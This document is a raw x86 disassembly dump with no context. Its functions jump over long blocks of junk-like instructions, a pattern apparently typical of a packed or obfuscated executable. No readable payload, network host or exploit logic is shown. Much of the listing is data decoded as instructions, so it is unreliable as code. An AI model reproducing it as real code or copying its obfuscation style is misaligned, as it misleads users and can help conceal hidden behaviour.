  404a50:	mov    esi,DWORD PTR [ebp+0x10]
  404a53:	mov    DWORD PTR [esi+0xc],eax
  404a56:	mov    eax,DWORD PTR [ebp+0x1c]
  404a59:	mov    esi,DWORD PTR [ebp+0x10]
  404a5c:	mov    DWORD PTR [esi+0x10],eax
  404a5f:	mov    eax,eax
  404a61:	mov    eax,DWORD PTR [ebp+0x8]
  404a64:	xor    eax,ecx
  404a66:	add    eax,edx
  404a68:	pop    esi
  404a69:	leave  
  404a6a:	ret    0x18
  404a6d:	push   ebp
  404a6e:	mov    ebp,esp
  404a70:	mov    eax,DWORD PTR [ebp+0xc]
  404a73:	xor    edx,edx
  404a75:	mov    ecx,0x7264fca9
  404a7a:	jmp    0x404d36
  404a7f:	xor    dh,BYTE PTR ss:[edi]
  404a82:	loope  0x404ab7
  404a84:	loope  0x404a76
  404a86:	icebp  
  404a87:	pop    es
  404a88:	mov    DWORD PTR [ebp+0x79],ecx
  404a8b:	lock movsx edi,BYTE PTR [edi+eax*2]
  404a90:	and    eax,0x7c917e7e
  404a95:	jle    0x404b15
  404a97:	in     eax,dx
  404a98:	sub    al,BYTE PTR [edx+0xf83af19]
  404a9e:	mov    ebx,0xe6e8790a
  404aa3:	xor    DWORD PTR [eax],0xd3505e78
  404aa9:	jl     0x404b27
  404aab:	lods   eax,DWORD PTR ds:[esi]
  404aac:	jno    0x404ae8
  404aae:	popf   
  404aaf:	push   ebp
  404ab0:	loope  0x404b0d
  404ab2:	ficom  DWORD PTR [edx-0x80]
  404ab5:	and    dh,bh
  404ab7:	cmc    
  404ab8:	add    BYTE PTR [ebp+edi*2-0x5f],ch
  404abc:	fs mov esp,0xb7bb1589
  404ac2:	sbb    bl,al
  404ac4:	xchg   edi,eax
  404ac5:	(bad)  [edx+eiz*8+0x21]
  404ac9:	stos   BYTE PTR es:[edi],al
  404aca:	int3   
  404acb:	pusha  
  404acc:	adc    al,0xa5
  404ace:	and    BYTE PTR [esi+ecx*1],dl
  404ad1:	es push cs
  404ad3:	dec    ebp
  404ad4:	shr    BYTE PTR [edi+0x42],cl
  404ad7:	aam    0xa5
  404ad9:	add    al,0x35
  404adb:	push   0xcfe5f0e2
  404ae0:	xchg   edx,eax
  404ae1:	mov    esp,0xbdaa8b1a
  404ae6:	int3   
  404ae7:	inc    ebx
  404ae8:	inc    esi
  404ae9:	push   0xc54ebdc7
  404aee:	icebp  
  404aef:	test   BYTE PTR [esi-0x23],0x77
  404af3:	out    0xa,al
  404af5:	inc    edx
  404af6:	pop    ebp
  404af7:	xor    eax,0x6d72a651
  404afc:	push   edi
  404afd:	cmp    DWORD PTR [ebx+0x39b3e68b],ecx
  404b03:	lods   eax,DWORD PTR ds:[esi]
  404b04:	xchg   edi,eax
  404b05:	popf   
  404b06:	inc    esi
  404b07:	shl    BYTE PTR [edx],0xc4
  404b0a:	leave  
  404b0b:	gs jle 0x404aa9
  404b0e:	test   DWORD PTR [edx+0x7189a209],edi
  404b14:	push   0x48afe22b
  404b19:	arpl   WORD PTR [eax-0x4396b09b],bp
  404b1f:	jmp    0xad411814
  404b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b25:	inc    edx
  404b26:	jge    0x404af3
  404b28:	jo     0x404afb
  404b2a:	inc    edi
  404b2b:	rol    DWORD PTR [edi],cl
  404b2d:	daa    
  404b2e:	fist   WORD PTR [edi-0x4]
  404b31:	in     al,0x20
  404b33:	pmaxub mm5,mm5
  404b36:	cmp    eax,0x6075967a
  404b3b:	aam    0xdd
  404b3d:	lods   eax,DWORD PTR ds:[esi]
  404b3e:	test   eax,0x5cc0fb89
  404b43:	out    dx,al
  404b44:	xlat   BYTE PTR ds:[ebx]
  404b45:	sub    esp,DWORD PTR [ebp-0x2419a518]
  404b4b:	inc    bp
  404b4d:	lock or BYTE PTR [ebx],bl
  404b50:	rcl    BYTE PTR [ebx+edx*2-0x2e],1
  404b54:	jg     0x404b22
  404b56:	fs fs (bad) 
  404b59:	nop
  404b5a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b5c:	lods   eax,DWORD PTR ds:[esi]
  404b5d:	ret    0xadf7
  404b60:	aaa    
  404b61:	pop    edx
  404b62:	outs   dx,DWORD PTR ds:[esi]
  404b63:	and    ecx,DWORD PTR [esi+ebp*4]
  404b66:	out    0x87,eax
  404b68:	xchg   DWORD PTR [esp+eiz*2],ebp
  404b6b:	sub    eax,0x6f176cc0
  404b70:	push   ecx
  404b71:	fcomp  DWORD PTR [eax-0x3]
  404b74:	imul   esi,DWORD PTR [esi],0x36
  404b77:	cmp    eax,0xd43f440a
  404b7c:	push   ss
  404b7d:	ss out dx,al
  404b7f:	test   eax,0x1040eb6c
  404b84:	leave  
  404b85:	pop    ecx
  404b86:	xchg   edx,eax
  404b87:	ret    0x5065
  404b8a:	test   DWORD PTR [edi+0x6bf26c73],0x55d1f98d
  404b94:	dec    dl
  404b96:	jo     0x404c0a
  404b98:	bound  esp,QWORD PTR [eax-0x6700c592]
  404b9e:	inc    esi
  404b9f:	jb     0x404bfc
  404ba1:	stos   DWORD PTR es:[edi],eax
  404ba2:	or     ah,BYTE PTR [edx-0x40]
  404ba5:	enter  0x1e46,0xfa
  404ba9:	inc    edx
  404baa:	jno    0x404b5e
  404bac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bad:	aam    0x2d
  404baf:	or     BYTE PTR [esi],ah
  404bb1:	pushf  
  404bb2:	xor    DWORD PTR gs:[edi],eax
  404bb5:	jmp    0x404b80
  404bb7:	cdq    
  404bb8:	and    eax,0xa234fadb
  404bbd:	mov    esi,0xb14dfa44
  404bc2:	and    edx,edi
  404bc4:	out    0xac,al
  404bc6:	mov    ebx,0x6aaf5ded
  404bcb:	xor    DWORD PTR [eax+0x2e36c2e5],eax
  404bd1:	js     0x404c3a
  404bd3:	dec    edi
  404bd4:	fsub   DWORD PTR fs:[ebx-0x6d]
  404bd8:	fdivr  st(4),st
  404bda:	xor    BYTE PTR [eax],0xa3
  404bdd:	jg     0x404c38
  404bdf:	daa    
  404be0:	xor    BYTE PTR [eax-0x125db962],ah
  404be6:	retf   
  404be7:	ud2    
  404be9:	sub    ecx,DWORD PTR [esi+0x2a]
  404bec:	fstp   DWORD PTR [eax-0x60]
  404bef:	push   0x87951659
  404bf4:	xor    eax,0x81b4a4b7
  404bf9:	imul   ecx,DWORD PTR [edx],0x1d4dd95b
  404bff:	into   
  404c00:	lods   eax,DWORD PTR ds:[esi]
  404c01:	or     BYTE PTR [esi-0x61],0xb8
  404c05:	idiv   BYTE PTR [edi+0x40324c18]
  404c0b:	mov    edx,esp
  404c0d:	ds pop ds
  404c0f:	pop    eax
  404c10:	mov    esp,0xb42fa323
  404c15:	dec    eax
  404c16:	stos   BYTE PTR es:[edi],al
  404c17:	bound  ebx,QWORD PTR [edi-0x17]
  404c1a:	pop    es
  404c1b:	mov    BYTE PTR [ecx-0x202759df],ch
  404c21:	pop    esi
  404c22:	test   BYTE PTR [esi-0x1a9164aa],al
  404c28:	push   es
  404c29:	cmp    esp,DWORD PTR [edx]
  404c2b:	dec    eax
  404c2c:	dec    ecx
  404c2d:	rcr    BYTE PTR [edx-0x5b],cl
  404c30:	sti    
  404c31:	dec    edi
  404c32:	inc    edi
  404c33:	push   esi
  404c34:	mov    DWORD PTR [edi+ecx*2],edi
  404c37:	add    BYTE PTR [ecx+0x7],ch
  404c3a:	fwait
  404c3b:	and    edi,edx
  404c3d:	jge    0x404be0
  404c3f:	xchg   DWORD PTR [ebx+0x65bf8e91],ebx
  404c45:	jl     0x404c4c
  404c47:	inc    edi
  404c48:	jp     0x404bff
  404c4a:	faddp  st(1),st
  404c4c:	xstore-rng (bad)
  404c4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c4e:	inc    ecx
  404c4f:	sbb    DWORD PTR [esi+0x68],ebx
  404c52:	(bad)  [edx+0x8d32bbc]
  404c58:	aas    
  404c59:	adc    eax,ebp
  404c5b:	jne    0x404c83
  404c5d:	pop    ds
  404c5e:	lds    edx,FWORD PTR [ecx-0x2b08bf9e]
  404c64:	or     al,0xef
  404c66:	adc    al,0xd3
  404c68:	sub    al,0xa8
  404c6a:	xchg   esi,eax
  404c6b:	and    BYTE PTR [eax],cl
  404c6d:	imul   ebp,edx,0x102d185b
  404c73:	xor    bl,dh
  404c75:	(bad)  
  404c76:	mov    edx,0x5732a81e
  404c7c:	out    0xd5,eax
  404c7e:	adc    al,0xd6
  404c80:	dec    edi
  404c81:	pop    eax
  404c82:	xchg   esi,eax
  404c83:	pop    ss
  404c84:	lock sub eax,0xb41eb55c
  404c8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c8b:	fwait
  404c8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c8d:	cmp    BYTE PTR [eax-0x5a],al
  404c90:	loopne 0x404c88
  404c92:	(bad)  
  404c93:	push   0x67b4b189
  404c98:	cwde   
  404c99:	jbe    0x404cfb
  404c9b:	test   al,0xc4
  404c9d:	push   ecx
  404c9e:	mov    eax,0xa1caf1cf
  404ca3:	push   ds
  404ca4:	inc    ebx
  404ca5:	mov    ebp,0xf93e5086
  404caa:	addr16 xchg edi,eax
  404cac:	in     eax,0x12
  404cae:	adc    eax,0x77145029
  404cb3:	jl     0x404cdc
  404cb5:	outs   dx,BYTE PTR ds:[esi]
  404cb6:	jle    0x404cb8
  404cb8:	outs   dx,DWORD PTR ds:[esi]
  404cb9:	jnp    0x404ca8
  404cbb:	outs   dx,BYTE PTR ds:[esi]
  404cbc:	ins    DWORD PTR es:[edi],dx
  404cbd:	mov    edi,0x376c620a
  404cc2:	push   esp
  404cc3:	mov    ebp,0x92df8eb9
  404cc8:	jp     0x404d0e
  404cca:	dec    eax
  404ccb:	rcl    BYTE PTR [ebp-0xd588981],1
  404cd1:	shr    DWORD PTR [ecx+0x249311d1],0xcb
  404cd8:	shl    DWORD PTR ds:0xd960d24,0xfe
  404cdf:	sbb    ebx,DWORD PTR [edi+0x70]
  404ce2:	out    0x5d,al
  404ce4:	test   BYTE PTR [eax+0x5e],cl
  404ce7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ce8:	push   edi
  404ce9:	push   ss
  404cea:	jg     0x404d37
  404cec:	mov    dl,0xea
  404cee:	sub    bl,BYTE PTR [esi-0x5d645136]
  404cf4:	test   DWORD PTR [ecx-0x2c622d4f],edi
  404cfa:	push   esi
  404cfb:	inc    esp
  404cfc:	popa   
  404cfd:	fs es inc edx
  404d00:	stos   BYTE PTR es:[edi],al
  404d01:	rcr    BYTE PTR [edi+ecx*8-0x7c14fd5c],0x6d
  404d09:	(bad)  
  404d0a:	sti    
  404d0b:	loopne 0x404cbe
  404d0d:	pop    ds
  404d0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d0f:	call   0xd4cb00e6
  404d14:	xchg   ebp,eax
  404d15:	lock add eax,0x8347d6b6
  404d1b:	mov    ecx,0x1483b2f2
  404d20:	sbb    DWORD PTR [ecx],esi
  404d22:	and    al,0x2f
  404d24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d25:	aas    
  404d26:	jge    0x404d7f
  404d28:	jmp    0xb2c4:0x59cfd30c
  404d2f:	cli    
  404d30:	mov    dl,0x43
  404d32:	ficom  DWORD PTR [esi-0xe0892e4]
  404d38:	mov    ecx,DWORD PTR [ebp+0x10]
  404d3b:	and    ecx,eax
  404d3d:	or     ecx,0x81161d8f
  404d43:	mov    eax,ecx
  404d45:	pop    ebp
  404d46:	ret    0x18
  404d49:	push   ebp
  404d4a:	mov    ebp,esp
  404d4c:	jmp    0x404f59
  404d51:	pop    ds
  404d52:	iret   
  404d53:	xchg   edi,eax
  404d54:	cmp    DWORD PTR [edi+0x41],esi
  404d57:	jno    0x404d42
  404d59:	das    
  404d5a:	ins    BYTE PTR es:[edi],dx
  404d5b:	xchg   esp,eax
  404d5c:	mov    eax,0x3fbef441
  404d61:	out    0x20,al
  404d63:	jle    0x404de3
  404d65:	outs   dx,BYTE PTR ds:[esi]
  404d66:	jg     0x404de6
  404d68:	jle    0x404d33
  404d6a:	add    eax,0xf3554eec
  404d6f:	pop    esi
  404d70:	outs   dx,BYTE PTR ds:[esi]
  404d71:	jg     0x404d92
  404d73:	add    eax,0x2f219a5b
  404d78:	pop    DWORD PTR [ebx]
  404d7a:	mov    ebx,0xab962518
  404d7f:	pop    edi
  404d80:	cmp    esi,ebp
  404d82:	gs sbb ah,ah
  404d85:	push   ecx
  404d86:	rol    DWORD PTR [esi+eax*2],1
  404d89:	outs   dx,DWORD PTR ds:[esi]
  404d8a:	sbb    BYTE PTR [eax-0x3b],al
  404d8d:	hlt    
  404d8e:	sti    
  404d8f:	imul   ecx,DWORD PTR [ebp-0x6b],0x23ac43b
  404d96:	mov    ebp,ebx
  404d98:	shr    BYTE PTR [ebp+0x6f],0xec
  404d9c:	jns    0x404de3
  404d9e:	cmp    al,0x17
  404da0:	fstp   DWORD PTR [eax+0x3d]
  404da3:	xchg   ebp,eax
  404da4:	sbb    eax,DWORD PTR [eax+0x4e06d2b4]
  404daa:	stos   BYTE PTR es:[edi],al
  404dab:	xchg   bl,al
  404dad:	enter  0x6ea9,0xe4
  404db1:	adc    eax,0xe4db9688
  404db6:	outs   dx,BYTE PTR ds:[esi]
  404db7:	pop    ebp
  404db8:	sti    
  404db9:	enter  0x5938,0x63
  404dbd:	cmp    al,BYTE PTR [ebp+0x178741ea]
  404dc3:	cld    
  404dc4:	add    edx,edx
  404dc6:	aaa    
  404dc7:	nop
  404dc8:	and    BYTE PTR [ebx+0x38707e2b],dl
  404dce:	js     0x404e33
  404dd0:	xchg   edx,eax
  404dd1:	scas   al,BYTE PTR es:[edi]
  404dd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dd3:	lds    edi,FWORD PTR [ecx-0x75388f18]
  404dd9:	cwde   
  404dda:	outs   dx,DWORD PTR ds:[esi]
  404ddb:	jmp    0x404d9b
  404ddd:	jmp    0x7e62b10a
  404de2:	mov    bh,0xb
  404de4:	hlt    
  404de5:	lahf   
  404de6:	or     al,0x7d
  404de8:	hlt    
  404de9:	mov    ds,WORD PTR [edx]
  404deb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dec:	xor    BYTE PTR [ebx],bl
  404dee:	imul   esp,DWORD PTR [edi-0xd],0x6e
  404df2:	cmp    BYTE PTR [edi-0x59178a30],0x36
  404df9:	cmp    eax,0x7384fa81
  404dfe:	mov    DWORD PTR [edi+esi*8],esi
  404e01:	jb     0x404de8
  404e03:	inc    ebx
  404e04:	xor    BYTE PTR [ecx-0x6f93ea91],dl
  404e0a:	pop    eax
  404e0b:	jl     0x404e10
  404e0d:	mov    DWORD PTR [ecx],edx
  404e0f:	add    ch,BYTE PTR [ebx-0x32]
  404e12:	fld    QWORD PTR [ecx+edx*1-0x40a8c498]
  404e19:	test   al,0x27
  404e1b:	rol    dh,0x7a
  404e1e:	mov    al,ds:0xce4f9f4f
  404e23:	adc    al,0xae
  404e25:	scas   eax,DWORD PTR es:[edi]
  404e26:	pop    esi
  404e27:	loope  0x404dc5
  404e29:	clc    
  404e2a:	daa    
  404e2b:	lds    esp,FWORD PTR [esi+0x15]
  404e2e:	mov    DWORD PTR [esi],ecx
  404e30:	(bad)  
  404e31:	leave  
  404e32:	adc    al,0x82
  404e34:	sbb    BYTE PTR [ecx+ecx*4+0x3a37efa0],ah
  404e3b:	dec    ebx
  404e3c:	in     al,dx
  404e3d:	and    bl,cl
  404e3f:	xor    cl,dh
  404e41:	repnz lea ebx,[eax+0x2d3648e5]
  404e48:	jnp    0x404de3
  404e4a:	iret   
  404e4b:	xor    dh,ch
  404e4d:	jmp    0x404e21
  404e4f:	arpl   WORD PTR [edx+0x4a],bx
  404e52:	push   edi
  404e53:	add    eax,0xd354501d
  404e58:	iret   
  404e59:	(bad)  
  404e5a:	(bad)  
  404e5b:	aad    0xec
  404e5d:	enter  0xb5c4,0x20
  404e61:	imul   esp,esp,0x974ad282
  404e67:	adc    DWORD PTR [eax],ecx
  404e69:	and    eax,0x54ac580b
  404e6e:	les    edx,FWORD PTR [esi+0x3b]
  404e71:	retf   0xedf1
  404e74:	cmp    BYTE PTR [esi+ebx*4+0x609af5e7],0x5f
  404e7c:	out    0x2a,eax
  404e7e:	test   eax,0x1d6b03f8
  404e83:	mov    dl,0xdb
  404e85:	fisub  DWORD PTR [edx+0x27]
  404e88:	xor    al,0xb7
  404e8a:	hlt    
  404e8b:	bound  edx,QWORD PTR [esi]
  404e8d:	or     dh,BYTE PTR [edx]
  404e8f:	retf   
  404e90:	mov    BYTE PTR [ebx],al
  404e92:	mov    cl,0x32
  404e94:	mov    ebx,0xa2c422b5
  404e99:	lahf   
  404e9a:	xor    cl,0x55
  404e9d:	aaa    
  404e9e:	sbb    DWORD PTR es:[ebp-0x7d289a33],eax
  404ea5:	pop    edx
  404ea6:	loop   0x404e5c
  404ea8:	push   ecx
  404ea9:	fsubr  DWORD PTR [esi+esi*1+0x36bdf4ed]
  404eb0:	pop    esp
  404eb1:	repnz cmp esi,DWORD PTR ds:0x288d9bd
  404eb8:	loope  0x404ec2
  404eba:	cmp    al,0x31
  404ebc:	xchg   bh,dh
  404ebe:	loopne 0x404ed9
  404ec0:	push   ss
  404ec1:	cwde   
  404ec2:	in     eax,0x35
  404ec4:	mov    bl,0xc1
  404ec6:	push   0x855a231f
  404ecb:	lods   eax,DWORD PTR ds:[esi]
  404ecc:	mov    esp,0x11a54a86
  404ed1:	js     0x404ef4
  404ed3:	mov    ebx,0x303cb394
  404ed8:	daa    
  404ed9:	(bad)  
  404eda:	cdq    
  404edb:	mov    esi,0x30f7d5f4
  404ee0:	int3   
  404ee1:	mov    esp,0x366eff9
  404ee6:	rcl    DWORD PTR [esi+0x10],cl
  404ee9:	pusha  
  404eea:	ds addr16 dec edi
  404eed:	into   
  404eee:	sub    al,0x12
  404ef0:	ds jecxz 0x404f20
  404ef3:	dec    eax
  404ef4:	and    dh,BYTE PTR [ecx+0x50]
  404ef7:	idiv   BYTE PTR [ebp+0x32]
  404efa:	cli    
  404efb:	push   esi
  404efc:	retf   
  404efd:	add    BYTE PTR [edx],cl
  404eff:	test   DWORD PTR [ecx-0x32],ecx
  404f02:	sbb    BYTE PTR [edi+0x54cc0a91],0xba
  404f09:	aas    
  404f0a:	pop    edi
  404f0b:	inc    edx
  404f0c:	nop
  404f0d:	retf   0xa570
  404f10:	dec    eax
  404f11:	das    
  404f12:	lock or eax,0x1a7a1a48
  404f18:	outs   dx,BYTE PTR ds:[esi]
  404f19:	fistp  QWORD PTR [ecx+0x11c28114]
  404f1f:	xchg   edx,eax
  404f20:	pop    esi
  404f21:	dec    ebx
  404f22:	xchg   ebx,eax
  404f23:	pop    esi
  404f24:	js     0x404eae
  404f26:	in     eax,dx
  404f27:	sbb    esp,DWORD PTR [edx+0x16]
  404f2a:	sub    BYTE PTR [esi+edx*2-0x10],bl
  404f2e:	hlt    
  404f2f:	data16 cs xor al,0x7f
  404f33:	fcomp  QWORD PTR [edi+0x673c58a2]
  404f39:	out    0x4b,al
  404f3b:	stc    
  404f3c:	push   esi
  404f3d:	(bad)  
  404f3e:	jmp    0x2b212259
  404f43:	sahf   
  404f44:	or     eax,0x78948464
  404f49:	inc    ebp
  404f4a:	mov    ss,WORD PTR [eax-0x1892b3f7]
  404f50:	jns    0x404efa
  404f52:	adc    eax,0x8a8e4afd
  404f57:	mov    ah,0xab
  404f59:	push   ecx
  404f5a:	and    DWORD PTR ds:0x430459,0x0
  404f64:	jmp    0x404f74
  404f69:	mov    eax,ds:0x430459
  404f6e:	inc    eax
  404f6f:	mov    ds:0x430459,eax
  404f74:	cmp    DWORD PTR ds:0x430459,0x15
  404f7b:	jae    0x404fbb
  404f81:	cmp    DWORD PTR ds:0x430459,0x17
  404f88:	jne    0x404fa4
  404f8e:	push   0x42e7d4
  404f93:	push   DWORD PTR [ebp-0x10]
  404f96:	push   0x32cc
  404f9b:	push   DWORD PTR [ebp-0x24]
  404f9e:	call   DWORD PTR ds:0x42ea9f
  404fa4:	jmp    0x404f69
  404fa9:	mov    edx,DWORD PTR ds:0x42edd7
  404faf:	xor    edx,DWORD PTR ds:0x430451
  404fb5:	mov    DWORD PTR ds:0x42edd7,edx
  404fbb:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  404fc2:	mov    edx,DWORD PTR ds:0x42ee69
  404fc8:	mov    eax,ds:0x42e983
  404fcd:	sub    eax,edx
  404fcf:	and    edx,DWORD PTR [edx+eax*1]
  404fd2:	mov    eax,DWORD PTR [ebp-0x4]
  404fd5:	movzx  ecx,WORD PTR ds:0x42e7d8
  404fdc:	sub    ecx,DWORD PTR ds:0x43044d
  404fe2:	mov    DWORD PTR ds:0x42e7d8,ecx
  404fe8:	mov    edx,DWORD PTR [ebp+0x10]
  404feb:	and    DWORD PTR ds:0x42edf3,0x0
  404ff5:	mov    ecx,DWORD PTR ds:0x42edf3
  404ffb:	inc    ecx
  404ffc:	mov    DWORD PTR ds:0x42edf3,ecx
  405002:	cmp    DWORD PTR ds:0x42edf3,0x7
  405009:	jne    0x405018
  40500f:	push   DWORD PTR [ebp-0x28]
  405012:	call   DWORD PTR ds:0x42e9d3
  405018:	cmp    DWORD PTR ds:0x42edf3,0x6
  40501f:	jne    0x405034
  405025:	xor    ecx,ecx
  405027:	or     ecx,DWORD PTR ds:0x42edf3
  40502d:	inc    ecx
  40502e:	mov    DWORD PTR ds:0x42edf3,ecx
  405034:	cmp    DWORD PTR ds:0x42edf3,0x1e
  40503b:	jb     0x404ff5
  405041:	jmp    0x40524e
  405046:	inc    eax
  405047:	jo     0x405063
  405049:	xor    BYTE PTR [edx],ch
  40504b:	jo     0x40509d
  40504d:	jo     0x40502d
  40504f:	shl    BYTE PTR [eax],1
  405051:	outs   dx,BYTE PTR ds:[esi]
  405052:	je     0x4050c2
  405054:	bswap  esi
  405056:	(bad)  
  405057:	cs jle 0x4050d8
  40505a:	outs   dx,BYTE PTR ds:[esi]
  40505b:	jg     0x4050db
  40505d:	jle    0x404ff7
  40505f:	aas    
  405060:	xor    eax,0x31b701a6
  405065:	clc    
  405066:	jmp    0x6169:0x9212b89d
  40506d:	das    
  40506e:	push   ecx
  40506f:	lock or al,0x4
  405072:	add    DWORD PTR [ebx],edx
  405074:	int3   
  405075:	(bad)  
  405076:	scas   al,BYTE PTR es:[edi]
  405077:	(bad)  
  405078:	fs cmc 
  40507a:	add    edi,ecx
  40507c:	stc    
  40507d:	sbb    al,BYTE PTR [ebx-0x17337ea9]
  405083:	outs   dx,DWORD PTR ds:[esi]
  405084:	sti    
  405085:	or     eax,0xb15a3307
  40508a:	popf   
  40508b:	jbe    0x405064
  40508d:	fmul   QWORD PTR [ebx-0x6e38f1db]
  405093:	mov    esi,0xfc58a1e3
  405098:	shl    BYTE PTR [edi],cl
  40509a:	mov    esp,0x9653a342
  40509f:	pop    eax
  4050a0:	mov    DWORD PTR [ebx+edi*8+0x33],eax
  4050a4:	ss pop ebp
  4050a6:	push   es
  4050a7:	mov    esi,0x5f1327c
  4050ac:	jne    0x40508e
  4050ae:	cli    
  4050af:	(bad)  
  4050b0:	lds    edi,FWORD PTR [edx]
  4050b2:	mov    ds:0x5ca3ce4,al
  4050b7:	jbe    0x4050e1
  4050b9:	mov    edx,0x1f44a05d
  4050be:	adc    BYTE PTR ds:0x926f9c2a,bl
  4050c4:	push   esi
  4050c5:	adc    eax,0x1cd60b66
  4050ca:	cmp    al,0x23
  4050cc:	push   eax
  4050cd:	(bad)  
  4050ce:	mov    WORD PTR [ecx-0x472f792b],?
  4050d4:	enter  0xe568,0xfe
  4050d8:	xchg   ebp,eax
  4050d9:	(bad)
  4050de:	push   ebp
  4050df:	retf   
  4050e0:	xor    BYTE PTR [eax],bh
  4050e2:	mov    dl,0x8f
  4050e4:	pop    ebx
  4050e5:	xchg   esi,eax
  4050e6:	es cwde 
  4050e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050e9:	push   0x61d74da2
  4050ee:	in     al,dx
  4050ef:	test   eax,0x891773e
  4050f4:	fistp  DWORD PTR [ecx+0x52aec0d1]
  4050fa:	fdiv   DWORD PTR [ecx+eax*1+0xe4aaa7e]
  405101:	in     eax,0x18
  405103:	jg     0x405157
  405105:	scas   eax,DWORD PTR es:[edi]
  405106:	dec    edi
  405107:	pop    edx
  405108:	ds in  al,0x54
  40510b:	test   DWORD PTR [edi-0x26],esi
  40510e:	jge    0x4050e3
  405110:	out    0x52,eax
  405112:	loope  0x405134
  405114:	ss jne 0x4050b9
  405117:	mov    ebx,DWORD PTR [edi+ebx*8]
  40511a:	mov    bl,0xac
  40511c:	mov    ch,0xd5
  40511e:	fbstp  TBYTE PTR [edi+0x73]
  405121:	fst    DWORD PTR [esi+0x7ec2fb41]
  405127:	out    0x81,al
  405129:	popf   
  40512a:	std    
  40512b:	xchg   ebp,eax
  40512c:	adc    al,0xba
  40512e:	stc    
  40512f:	scas   eax,DWORD PTR es:[edi]
  405130:	mov    eax,DWORD PTR [ebx]
  405132:	dec    esi
  405133:	(bad)  
  405134:	int    0xe0
  405136:	test   eax,edx
  405138:	cli    
  405139:	dec    ebx
  40513a:	sub    eax,0x42a47821
  40513f:	pop    edx
  405140:	lods   eax,DWORD PTR ds:[esi]
  405141:	rcr    BYTE PTR [edx+0x7c],0xd4
  405145:	and    al,0x16
  405147:	add    BYTE PTR [edi+0x6322a820],ah
  40514d:	mov    ebx,0xf27bda9a
  405152:	inc    eax
  405153:	dec    ebx
  405154:	repz sar DWORD PTR [ebx],cl
  405157:	repnz and DWORD PTR ds:0x79781e91,esi
  40515e:	int    0x41
  405160:	adc    eax,0x5c37678a
  405165:	(bad)  
  405166:	adc    ebx,ebp
  405168:	out    dx,al
  405169:	lods   eax,DWORD PTR ds:[esi]
  40516a:	dec    ecx
  40516b:	xchg   DWORD PTR [edx+0x5c],edi
  40516e:	mov    ah,0x78
  405170:	stos   DWORD PTR es:[edi],eax
  405171:	neg    al
  405173:	sbb    cl,BYTE PTR [esp+ebx*8-0x24]
  405177:	(bad)  
  405178:	pop    esi
  405179:	inc    eax
  40517a:	sbb    DWORD PTR [edx-0xf],edx
  40517d:	pop    edi
  40517e:	mov    al,ds:0xa20df0db
  405183:	mov    dl,0x51
  405185:	sbb    DWORD PTR [eax+0x2ce1f89a],edx
  40518b:	cmp    al,BYTE PTR [ecx*4+0x67cdc998]
  405192:	aas    
  405193:	or     BYTE PTR [ecx+ebp*8],0x5e
  405197:	pop    ecx
  405198:	xor    DWORD PTR [ebx],0x7fa38467
  40519e:	es mov edx,0x2047eebb
  4051a4:	jmp    FWORD PTR ds:0xf810b98e
  4051aa:	lods   al,BYTE PTR ds:[esi]
  4051ab:	(bad)  
  4051ac:	in     eax,dx
  4051ad:	sbb    eax,0x717a045d
  4051b2:	iret   
  4051b3:	loope  0x4051e4
  4051b5:	inc    esp
  4051b6:	popa   
  4051b7:	enter  0x9367,0x27
  4051bb:	jno    0x405197
  4051bd:	pop    eax
  4051be:	or     al,0x65
  4051c0:	(bad)  
  4051c1:	cli    
  4051c2:	jmp    0x405168
  4051c4:	cmp    eax,0x7e487292
  4051c9:	setg   al
  4051cc:	icebp  
  4051cd:	push   ds
  4051ce:	fldenv [eax+0x7c024e56]
  4051d4:	daa    
  4051d5:	pop    edi
  4051d6:	sub    ah,dl
  4051d8:	ja     0x405201
  4051da:	das    
  4051db:	and    DWORD PTR [esi-0x128fdf1e],edi
  4051e1:	jmp    0x405175
  4051e3:	cmp    BYTE PTR [ebx+edi*2],0xe8
  4051e7:	repnz in al,dx
  4051e9:	jns    0x405181
  4051eb:	imul   edi,DWORD PTR [edx],0xd
  4051ee:	jo     0x405189
  4051f0:	test   eax,0xed4dd8d7
  4051f5:	(bad)  
  4051f6:	mov    dh,0x91
  4051f8:	adc    al,0xc2
  4051fa:	imul   ebx,DWORD PTR [ebx+ecx*2-0x11f9f52e],0x8a39588b
  405205:	mov    ebx,DWORD PTR [ebx+esi*2]
  405208:	stos   BYTE PTR es:[edi],al
  405209:	push   ecx
  40520a:	mov    edx,?
  40520c:	mov    ebp,0x31b6725e
  405211:	ss dec ebx
  405213:	js     0x4051bd
  405215:	push   cs
  405216:	xchg   ecx,eax
  405217:	push   ds
  405218:	inc    ebp
  405219:	sahf   
  40521a:	rcl    DWORD PTR [esi+0x5d],0xa5
  40521e:	inc    bl
  405220:	in     al,0x24
  405222:	push   0x75bb1f1a
  405227:	stos   DWORD PTR es:[edi],eax
  405228:	and    dl,ah
  40522a:	sbb    DWORD PTR [ebp-0x7d4cf325],edx
  405230:	ins    BYTE PTR es:[edi],dx
  405231:	(bad)  
  405232:	loopne 0x4051fe
  405234:	mov    ds:0xc09ae5c4,al
  405239:	add    esp,ecx
  40523b:	mov    ebx,0x570b4d5d
  405240:	xchg   esp,eax
  405241:	fsqrt  
  405243:	jmp    0x1161:0x7c76138a
  40524a:	lods   eax,DWORD PTR ds:[esi]
  40524b:	test   eax,0x54b9396e
  405250:	or     BYTE PTR [ecx+0x7],dl
  405253:	xor    eax,ecx
  405255:	add    eax,0x32729b
  40525a:	mov    DWORD PTR [edx],eax
  40525c:	mov    eax,DWORD PTR [ebp+0x14]
  40525f:	mov    edx,DWORD PTR [ebp+0x10]
  405262:	mov    DWORD PTR [edx+0x4],eax
  405265:	mov    eax,DWORD PTR [ebp+0x18]
  405268:	mov    edx,DWORD PTR [ebp+0x10]
  40526b:	jmp    0x405478
  405270:	sar    DWORD PTR [edx+ebp*4],cl
  405273:	push   ebp
